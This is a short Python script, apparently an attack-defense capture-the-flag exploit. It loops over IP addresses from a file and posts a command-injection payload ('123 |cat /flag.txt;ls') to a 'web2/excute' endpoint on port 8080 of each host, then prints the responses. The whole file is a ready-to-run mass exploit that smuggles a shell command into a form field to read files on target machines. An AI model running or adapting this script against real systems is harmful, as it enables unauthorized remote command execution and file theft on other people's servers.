import requests

def main():
    with open('./ip.txt') as fopen:
        ip_lists = fopen.readlines()
        ip_list = list(map(lambda ip_temp : ip_temp.replace('\n', '').replace('\r', ''), ip_lists))
        for ip in ip_list:
            headers = {
                    'Content-Length':'211',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': '1',
                    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36'
                }
            path = "web2/excute"
            port = "8080"
            data = {"cmd":"123 |cat /flag.txt;ls"}
            url = "http://{0}:{1}/{2}".format(ip, port, path)
            print(url)
            response = requests.post(url, data, headers=headers)
            print(response.text)
            #result = open("result.txt", "w")
            #result.write(ip + " ->  " + response.text + '\n')
             
if __name__ == "__main__":
    main()
